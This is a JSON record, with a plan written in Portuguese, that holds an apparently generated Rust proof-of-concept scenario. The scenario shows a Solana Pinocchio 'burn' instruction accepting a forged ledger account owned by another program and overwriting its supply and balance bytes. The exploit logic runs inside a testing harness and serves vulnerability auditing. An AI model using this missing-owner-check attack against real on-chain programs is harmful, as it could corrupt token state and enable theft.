{
  "plan": "O programa `burn` (Pinocchio) recebe uma unica conta `ledger` como `AccountInfo` generica e le/escreve diretamente os bytes 40..56 sem verificar o dono. O baseline usa uma conta legitima pertencente ao program_id com supply=1000 e balance=500, chamando burn(amount=100) e provando que o cenario esta correto. O ataque repete a mesma instrucao, mas substitui a conta por uma conta forjada pertencente a outro programa (attacker_program) com os mesmos dados. O efeito medido e que a conta forjada teve seus bytes 40..56 sobrescritos (supply e balance alterados), demonstrando que o programa aceitou e modificou uma conta que nao lhe pertence.",
  "scenario": "let program_id = env.program_id;

// Conta legitima pertencente ao programa, com supply=1000 e balance=500 nos offsets 40..56
let mut legit_data = vec![0u8; 64];
legit_data[40..48].copy_from_slice(&1000u64.to_le_bytes());
legit_data[48..56].copy_from_slice(&500u64.to_le_bytes());
let legit_ledger = account(&program_id, &legit_data, None);

// Instrucao burn: discriminador IX_BURN=1 + amount u64 LE
let amount: u64 = 100;
let mut ix_data = vec![1u8];
ix_data.extend_from_slice(&amount.to_le_bytes());

let metas = vec![AccountMeta::new(legit_ledger_key, false)];
let ix = env.raw_ix(&ix_data, metas);

let contas = vec![(legit_ledger_key, legit_ledger.clone())];
let r = env.baseline("burn legitimo em conta do programa", &ix, &contas);

// Ataque: conta forjada pertencente ao attacker_program (ou a outro programa)
let attacker_owner = env.attacker_program.unwrap_or(Pubkey::new_unique());
let mut forged_data = vec![0u8; 64];
forged_data[40..48].copy_from_slice(&1000u64.to_le_bytes());
forged_data[48..56].copy_from_slice(&500u64.to_le_bytes());
let forged_ledger = account(&attacker_owner, &forged_data, None);

let metas_attack = vec![AccountMeta::new(forged_ledger_key, false)];
let ix_attack = env.raw_ix(&ix_data, metas_attack);
let contas_attack = vec![(forged_ledger_key, forged_ledger.clone())];

let r_attack = env.attack("burn em conta forjada de outro programa", &ix_attack, &contas_attack);

if r_attack.program_result == ProgramResult::Success {
    let after_forged = after(&r_attack, &forged_ledger_key);
    let new_supply = read_u64(after_forged.data(), 40);
    let new_balance = read_u64(after_forged.data(), 48);
    env.effect(
        "conta forjada de outro programa foi aceita e teve supply/balance sobrescritos",
        new_supply == 900 && new_balance == 400,
    );
}"
}

